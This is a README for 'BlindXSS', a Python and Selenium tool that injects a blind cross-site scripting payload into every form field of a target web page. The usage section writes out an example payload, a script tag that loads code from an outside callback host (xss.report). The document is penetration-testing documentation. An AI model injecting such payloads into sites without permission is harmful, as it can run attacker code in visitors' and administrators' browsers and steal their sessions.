# BlindXSS - Automated Blind XSS Testing Tool

```
__________.__  .__            .___ ____  ___  _________ _________
\______   \  | |__| ____    __| _/ \   \/  / /   _____//   _____/
 |    |  _/  | |  |/    \  / __ |   \     /  \_____  \ \_____  \ 
 |    |   \  |_|  |   |  \/ /_/ |   /     \  /        \/        \
 |______  /____/__|___|  /\____ |  /___/\  \/_______  /_______  /
        \/             \/      \/        \_/        \/        \/ 

made by @hghost010
```

## 🎯 Description

BlindXSS is an automated web security testing tool designed to identify potential blind Cross-Site Scripting (XSS) vulnerabilities. The tool systematically injects XSS payloads into form inputs and interactive elements on web pages to help security researchers and penetration testers identify potential security weaknesses.

## ✨ Features

- **Automated Form Detection**: Automatically finds and tests input fields, textareas, select elements, and contenteditable elements
- **Comprehensive Testing**: Tests various HTML input types and interactive elements
- **Smart Navigation**: Handles form submissions and page redirections intelligently

## 🛠️ Requirements

### System Requirements
- Python 3.7+
- Chrome/Chromium browser
- Internet connection

### Python Dependencies
```
selenium>=4.0.0
webdriver-manager>=3.8.0
colorama>=0.4.4
```

## 📦 Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/Hghost0x00/Blind_XSS.git
   cd Blind_XSS
   ```

2. **Install Python dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Verify Chrome/Chromium installation:**
   - The tool uses webdriver-manager to automatically download and manage ChromeDriver
   - Ensure Chrome or Chromium is installed on your system

## 🚀 Usage

1. **Run the tool:**
   ```bash
   python bxss.py
   ```

2. **Enter target URL:**
   ```
   Enter the target URL: https://example.com/login
   ```

3. **Provide XSS payload:**

Enter your blind XSS payload: '"><script src=https://xss.report/c/__your_username__></script>

Tip: Using `xss.report` payloads is one of the easiest ways to use this tool. Simply create a free account and use your personalized payload.

4. **Monitor the testing process:**
   - The tool will automatically find and test all interactive elements



## 🐛 Troubleshooting

### Common Issues

**ChromeDriver not found:**
- Solution: The webdriver-manager should handle this automatically. If issues persist, manually install ChromeDriver.

**Permission denied errors:**
- Solution: Run with appropriate permissions or check Chrome installation.

**Timeout errors:**
- Solution: Increase the timeout values in the script for slower websites.



## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- Created by [@hghost010](https://x.com/hghost010)
- Built with Selenium WebDriver
- Uses webdriver-manager for Chrome driver management

## ⭐ Support

If you find this tool helpful, please consider:
- ⭐ Starring the repository
- 🐛 Reporting bugs and issues
- 💡 Suggesting new features
- ☕ Buy me a coffee: 2CZhBKWbacJyVs7k7BJiC3ay4tq3HsPtUysMeSqjRRd4 (Solana)
